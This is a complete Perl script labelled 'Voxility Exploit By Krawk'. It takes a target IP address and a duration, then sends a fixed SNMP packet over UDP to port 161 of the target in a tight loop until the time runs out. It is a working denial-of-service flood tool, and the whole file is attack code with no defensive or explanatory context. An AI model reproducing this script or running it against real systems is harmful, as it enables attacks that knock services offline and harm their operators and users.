use Socket;
use strict;
 
if ($#ARGV != 1) {
system("cls");
print "
Voxility Exploit By Krawk
";
exit(1);
}
 
my ($ip,$length) = @ARGV;
 
my ($iaddr,$endtime);

$iaddr = inet_aton("$ip") or die "Imposible atacar a $ip\n";
$endtime = time() + ($length ? $length : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
for (;time() <= $endtime;) {
send("flood", "\x30\x3A\x02\x01\x03\x30\x0F\x02\x02\x4A\x69\x02\x03\x00\xFF\xE3\x04\x01\x04\x02\x01\x03\x04\x10\x30\x0E\x04\x00\x02\x01\x00\x02\x01\x00\x04\x00\x04\x00\x04\x00\x30\x12\x04\x00\x04\x00\xA0\x0C\x02\x02\x37\xF0\x02\x01\x00\x02\x01\x00\x30\x00", 0, pack_sockaddr_in("161", $iaddr));
	};
	
	